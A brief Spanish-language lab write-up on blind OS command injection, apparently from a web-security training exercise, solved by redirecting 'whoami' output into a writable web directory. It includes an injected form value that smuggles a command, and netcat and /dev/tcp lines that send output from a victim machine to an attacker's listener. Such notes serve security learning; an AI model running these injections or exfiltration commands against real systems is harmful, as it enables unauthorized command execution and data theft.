# Inyección ciega con redirección de salida

Tags: #CommandInjection #RCE #BurpSuite 

```bash 
En este lab se resuelve una inyección de comandos del sistema operativo en modo ciego, utilizando redirección de salida para obtener los resultados. Aprovechamos que el directorio '/var/www/images/' es escribible, inyectando el comando 'whoami' y redirigiendo su salida a un archivo dentro de esa carpeta ('output.txt').

Luego se accede a ese archivo a través del sistema de carga de imágenes, logrando visualizar el resultado del comando ejecutado en el servidor.
```

```bash 
# Redirigir el output a una ruta que tiene permisos de escritura cuando sea a ciegas 
❯ name=test ; whoami > /var/www/images/test.txt ; &email    


# Si tienes un VPS se puede utilizar netcat 
❯ whoami | nc Public_IP 8082     # Ejecutar en la máquina víctima 
❯ nc -nlvp 8082                  # Recibir el comando en Kali 


❯ whoami > /dev/tcp/IP/8082      # Ejecutar en la máquina víctima 
❯ nc -nlvp 8082                  # Recibir el comando en Kali 
```